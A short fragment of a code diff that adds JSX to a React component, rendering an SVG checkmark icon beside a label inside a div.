+      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M20 6 9 17l-5-5" />
+      </svg>
+      {label}
+    </div>
+  );
+}
